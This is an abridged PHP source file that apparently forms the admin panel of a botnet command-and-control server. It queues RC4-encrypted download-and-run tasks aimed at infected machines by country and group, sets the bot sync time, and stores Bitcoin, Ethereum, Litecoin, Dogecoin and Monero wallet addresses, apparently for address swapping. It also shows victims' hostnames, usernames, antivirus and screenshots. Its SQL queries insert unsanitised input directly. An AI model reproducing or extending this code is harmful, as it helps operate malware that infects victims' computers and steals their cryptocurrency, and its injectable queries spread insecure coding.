<?php      
   ...
   function MakeTask($url, $comment, $arc, $run, $filetype, $folder, $limit, $units, $sids, $country, $group) 
   { 
      include("Cfg/Config.php"); 
      ...
      {
         $url_rc4 = '+++' . bin2hex(EncryptRC4($url, $conf['rc4key']));
      }
      ...
      {	
         mysqli_query($link, "INSERT INTO tasks (`id`, `path`, `path_rc4`, `tid`, `comment`, `arc`, `run`, `filetype`, `folder`, `tlimit`, `units`, `sids`, `country`, `group`) VALUES ( '1000001', '$url', '$url_rc4', '$tid', '$comment', $arc, '$run', '$filetype', '$folder', '$limit', '$units', '$sids', '$country', '$group')");
      }
      else
      {
         mysqli_query($link, "INSERT INTO tasks (`path`, `path_rc4`, `tid`, `comment`, `arc`, `run`, `filetype`, `folder`, `tlimit`, `units`, `sids`, `country`, `group`) VALUES ('$url', '$url_rc4', '$tid', '$comment', $arc, '$run', '$filetype', '$folder', '$limit', '$units', '$sids', '$country', '$group')");
      }

      mysqli_close($link); 
   } 

   function MakeTaskAlt($url, $tid, $comment, $arc, $run, $filetype, $folder, $limit, $units, $sids, $country, $group, $id, $ctlimit) 
   { 
      include("Cfg/Config.php"); 
      $url = strfix($url);
      ...
      mysqli_query($link, "UPDATE `tasks` SET `path` = '$url', `path_rc4` = '$url_rc4', `tid` = '$tid', `comment` = '$comment', `arc` = '$arc', `run` = '$run', `filetype` = '$filetype', `folder` = '$folder', `tlimit` = '$limit', `path` = '$url', `units` = '$units', `sids` = '$sids', `country` = '$country', `group` = '$group' WHERE `id` = '".$id."' LIMIT 1");
      ...
      $res =  "<div align=\"center\">
               <form action=\"" . basename($_SERVER['SCRIPT_NAME']) . "\" method=\"post\" name=\"form\"> 
                  <table border=\"0\" width=\"98%\" cellspacing=\"0\" class=table cellpadding=\"0\">
                     <tr>
                        <td>  
                           <table border=\"0\" width=\"100%\" height=\"500\" cellspacing=\"0\" cellpadding=\"0\">
                              <tr>
                              ...
                              <tr>
                                 <td>&nbsp;" . $lang["00611"] . ":</td>		 
                                 <td><input name=\"group\" class=task value=\"*\" style=\"float: left\"></td>
                                 <td>" . $lang["00781"] . "</td>
                              </tr>
                              <tr>
                                 <td>&nbsp;" . $lang["0062"] . ":</td>
                        ...
                        <tr>
                           <td>  
                              <table border=\"0\" width=\"100%\" height=\"500\" cellspacing=\"0\" cellpadding=\"0\">
                                 ...
                                 <tr>
                                    <td>&nbsp;" . $lang["00611"] . ":</td>
                                    <td><input name=\"group\" class=task value=\"$group\" style=\"float: left\"></td>
                                    <td>" .  $lang["00781"] . "</a></td>
                                 </tr>
                                 <tr>
                                    <td>&nbsp;" . $lang["0062"] . ":</td>
   ...
   function SaveSyncTime($SyncTime)
   {
      $pr = "    ";
      $cr = "\r\n";
      $rn = " = ";
      ...
      $content = $content . "<?php";
      $content = $content . $cr . $cr . $pr . $pr . "\$options[\"sync_time\"]" . $rn . "\"" . ($SyncTime + "2") . "\";";
      $content = $content . $cr . $pr . $pr . "\$options[\"bot_sync_time\"]" . $rn . "\"" . $SyncTime . "\";";
      $content = $content . $cr . $cr . "?>";

      file_put_contents("Cfg/Sync.php", $content);
      echo "<meta http-equiv=\"refresh\" content=\"1; url=Settings.php\">"; 
   }

   function SaveWallets($BtcAddr, $EthAddr, $LtcAddr, $DgeAddr, $MonAddr)
   {
      include("Cfg/Config.php"); 
      ...
      if (!empty($conf['rc4key']))
      {
         $BtcAddr = bin2hex(EncryptRC4($BtcAddr, $conf['rc4key']));
         $EthAddr = bin2hex(EncryptRC4($EthAddr, $conf['rc4key']));
         $LtcAddr = bin2hex(EncryptRC4($LtcAddr, $conf['rc4key']));
         $DgeAddr = bin2hex(EncryptRC4($DgeAddr, $conf['rc4key']));
         $MonAddr = bin2hex(EncryptRC4($MonAddr, $conf['rc4key']));
      }

      $content = $content . "<?php";
      $content = $content . $cr . $cr . $pr . $pr . "\$wallets[\"bitcoin\"]" . $rn . "\"" . $BtcAddr. "\";";
      $content = $content . $cr . $pr . $pr . "\$wallets[\"etherium\"]" . $rn . "\"" . $EthAddr. "\";";
      $content = $content . $cr . $pr . $pr . "\$wallets[\"litecoin\"]" . $rn . "\"" . $LtcAddr. "\";";
      $content = $content . $cr . $pr . $pr . "\$wallets[\"dogecoin\"]" . $rn . "\"" . $DgeAddr. "\";";
      $content = $content . $cr . $pr . $pr . "\$wallets[\"monero\"]" . $rn . "\"" . $MonAddr. "\";";

      $content = $content . $cr . $cr . "?>";

      file_put_contents("Cfg/Wallets.php", $content);
      echo "<meta http-equiv=\"refresh\" content=\"1; url=Settings.php\">"; 
   }
   ...
   function CreateTable()
   {
      ...
      mysqli_query($link, "CREATE TABLE IF NOT EXISTS `results` (`time` int(10) NOT NULL, `id` varchar(12) NOT NULL, `tid` varchar(12) NOT NULL, `res` int(1) NOT NULL, PRIMARY KEY (`time`)) ENGINE=MyISAM DEFAULT CHARSET=utf8");      
      echo "<meta http-equiv=\"refresh\" content=\"1; url=Settings.php\">"; 
   }
   ...
   function SaveOptions($h, $u, $a, $d, $l, $r, $y, $s)
   {
      ...
      $content = $content . "<?php";    
      $content = $content . $cr . $cr . $pr . $pr . "\$options[\"show_domain\"] = " . '"' . $d .'";';
      $content = $content . $cr . $pr . $pr . "\$options[\"show_av\"] = " . '"' . $a .'";';
      $content = $content . $cr . $pr . $pr . "\$options[\"show_hostname\"] = " . '"' . $h .'";';
      $content = $content . $cr . $pr . $pr . "\$options[\"show_username\"] = " . '"' . $u .'";';
      $content = $content . $cr . $pr . $pr . "\$options[\"show_screen\"] = " . '"' . $s .'";';
      $content = $content . $cr . $pr . $pr . "\$options[\"show_il\"] = " . '"' . $l .'";';
      $content = $content . $cr . $pr . $pr. "\$options[\"show_reg\"] = " . '"' . $r .'";';

      if ($y == 0)
      {
         $content = $content . $cr . $pr . $pr . "\$options[\"language\"] = " . '"' . "En" .'";';
      }

      if ($y == 1)
      {
         $content = $content . $cr . $pr . $pr . "\$options[\"language\"] = " . '"' . "Ru" .'";';
      }
   ...
   function MakeFormChangeSyncTime() 
   {          
      include("Cfg/Lang.php");
      include("Cfg/Sync.php");
      $res = "<div align=\"center\">
                  <table border=\"0\" width=\"98%\" class=table cellspacing = \"0\" cellpadding=\"0\">
                     <tr>
                        <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;" . $lang["0173"] . ":</td>
                     </tr>
                     <tr>
                        <td>
                           <div align=\"center\">
                              <form action=\"" . basename($_SERVER['SCRIPT_NAME']) . "\" method=\"post\" name=\"form\">
                                 <table border=\"0\" width=\"95%\" height=\"50\" class=table_lig cellspacing=\"0\" cellpadding=\"0\">
                                    <tr>
                                       <td>" . $lang["0174"] . ":</td>
                                       <td><input name=\"SyncTime\" class=task value=\"" . $options["bot_sync_time"] . "\" style=\"float: left\"></td>	            
                                       <td>" . $lang["0175"] . "</td>
                                    </tr>      
                                 </table>
                                 ...
                                 <table border=\"0\" width=\"1000\" cellspacing=\"0\" cellpadding=\"0\" height=\"5\">
                                    <tr>
                                       <td>
                                          <div align=\"center\">
                                             <input type=\"submit\" name=\"sync\" value=\"" . $lang["0105"] . "\" class=\"button\">
                                          </div>
                                       </td>
                                    </tr>
                                    <tr><td>&nbsp;</td></tr>
   ...
   function MakeFormChangeWallets() 
   {          
      include("Cfg/Lang.php");
      ...
      if (!empty($conf['rc4key']))
      {
         $BtcAddr = EncryptRC4(hex2bin($wallets["bitcoin"]), $conf['rc4key']);
         $EthAddr = EncryptRC4(hex2bin($wallets["etherium"]), $conf['rc4key']);
         $LtcAddr = EncryptRC4(hex2bin($wallets["litecoin"]), $conf['rc4key']);
         $DgeAddr = EncryptRC4(hex2bin($wallets["dogecoin"]), $conf['rc4key']);
         $MonAddr = EncryptRC4(hex2bin($wallets["monero"]), $conf['rc4key']);
      }
      else
      {
         $BtcAddr = $wallets["bitcoin"];
         $EthAddr = $wallets["etherium"];
         $LtcAddr = $wallets["litecoin"];
         $DgeAddr = $wallets["dogecoin"];
         $MonAddr = $wallets["monero"];
      }

      $res = "<div align=\"center\">
                  <table border=\"0\" width=\"98%\" class=table cellspacing = \"0\" cellpadding=\"0\">
                     <tr>
                        <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;" . $lang["0176"] . ":</td>
                     </tr>
                     <tr>
                        <td>
                           <div align=\"center\">
                              <form action=\"" . basename($_SERVER['SCRIPT_NAME']) . "\" method=\"post\" name=\"form\">
                                 <table border=\"0\" width=\"95%\" height=\"184\" class=table_lig cellspacing=\"0\" cellpadding=\"0\">
                                    <tr>
                                       <td>" . $lang["0177"] . ":</td>
                                       <td><input name=\"BtcAddr\" class=task value=\"" . $BtcAddr . "\" style=\"float: left\" size=\"60\"></td>	            
                                       <td>" . $lang["0178"] . "</td>
                                    </tr>
                                    <tr>
                                       <td>" . $lang["0179"] . ":</td>
                                       <td><input name=\"EthAddr\" class=task value=\"" . $EthAddr . "\" style=\"float: left\" size=\"60\"></td>	            
                                       <td>" . $lang["0180"] . "</td>
                                    </tr>  
                                    <tr>
                                       <td>" . $lang["0181"] . ":</td>
                                       <td><input name=\"LtcAddr\" class=task value=\"" . $LtcAddr . "\" style=\"float: left\" size=\"60\"></td>	            
                                       <td>" . $lang["0182"] . "</td>
                                    </tr> 
                                    <tr>
                                       <td>" . $lang["0183"] . ":</td>
                                       <td><input name=\"DgeAddr\" class=task value=\"" . $DgeAddr . "\" style=\"float: left\" size=\"60\"></td>	            
                                       <td>" . $lang["0184"] . "</td>
                                    </tr> 
                                    <tr>
                                       <td>" . $lang["0185"] . ":</td>
                                       <td><input name=\"MonAddr\" class=task value=\"" . $MonAddr . "\" style=\"float: left\" size=\"60\"></td>	            
                                       <td>" . $lang["0186"] . "</td>
                                    </tr> 
                                    <tr><td>&nbsp;</td></tr>
                                 </table>
                                 ...
                                 <table border=\"0\" width=\"1000\" cellspacing=\"0\" cellpadding=\"0\" height=\"5\">
                                    <tr>
                                       <td>
                                          <div align=\"center\">
                                             <input type=\"submit\" name=\"wallets\" value=\"" . $lang["0105"] . "\" class=\"button\">
                                          </div>
                                       </td>
                                    </tr>
                                    <tr><td>&nbsp;</td></tr>
